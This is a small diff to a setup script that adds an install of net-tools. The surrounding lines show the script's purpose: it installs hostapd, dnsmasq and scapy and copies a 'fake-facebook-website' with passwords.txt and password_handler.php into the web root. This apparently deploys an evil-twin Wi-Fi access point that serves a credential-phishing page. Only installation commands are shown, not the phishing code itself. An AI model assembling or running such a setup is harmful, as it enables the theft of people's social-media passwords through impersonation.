@@ -8,6 +8,7 @@ sudo apt install hostapd
 sudo apt install dnsmaskq
 sudo pip install scapy
 sudo pip install colorama
+sudo apt install net-tools
 sudo cp -rf fake-facebook-website/* /var/www/html/
 sudo chmod -x /var/www/html/passwords.txt
 sudo chmod -x /var/www/html/password_handler.php
